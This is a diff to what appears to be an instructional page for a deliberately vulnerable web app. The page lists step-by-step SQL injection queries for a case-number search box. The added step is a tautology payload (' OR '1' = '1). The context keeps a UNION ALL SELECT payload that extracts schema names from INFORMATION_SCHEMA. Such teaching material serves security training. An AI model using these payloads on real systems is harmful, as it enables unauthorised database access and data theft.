@@ -54,6 +54,9 @@ require('../resources/header.html');
         <p class='text-primary font-weight-bold'>SQL Injection Queries</p>
         <p>Type this into the case number search box. It can also be typed into the url as a get parameter.</p>
 
+        <p class='text-primary'>Step 0: See if SQL injection will work at all. </p>
+          <p>fakecasenumber' OR '1' = '1</p>
+
         <p class='text-primary'>Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.</p>
           <p>fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.schemata WHERE '1'='1</p>
 
